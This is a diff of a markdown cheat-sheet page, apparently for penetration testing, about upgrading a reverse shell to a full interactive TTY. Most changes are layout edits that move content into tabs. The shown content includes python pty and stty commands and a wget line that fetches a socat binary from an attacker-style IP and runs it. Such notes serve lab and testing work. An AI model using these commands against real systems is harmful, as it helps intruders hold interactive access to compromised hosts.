@@ -7,7 +7,9 @@ tags: ["shell", "python", "bash", "sh", "tty"]
 ---
 ### Upgrade Shell
 
-#### Check installed binary
+#### Check installed binaries
+
+<div>
 
 ```bash
 which sh
@@ -25,11 +27,14 @@ which python3
 which python
 ```
 
-<br>
+</div>
 
----
+{{< tab set1 tab1 active >}}python{{< /tab >}}
+{{< tab set1 tab2 >}}socat{{< /tab >}}
+{{< tab set1 tab3 >}}script{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
-### python
+<div>
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -45,13 +50,12 @@ stty raw -echo; fg
 export TERM=xterm-256color
 ```
 
-<br>
+</div>
 
----
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
-### socat
-
-[Download socat](https://github.com/3ndG4me/socat)
+<div>
 
 ```bash
 # Start a local http server
@@ -73,14 +77,21 @@ wget -q http://10.10.14.10/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/so
 export TERM=xterm-256color
 ```
 
-<br>
+</div>
 
----
+<small>*Ref: [Download socat](https://github.com/3ndG4me/socat)*</small>
 
-### script
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
+
+<div>
 
 ```bash
 script -qc /bin/bash /dev/null
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
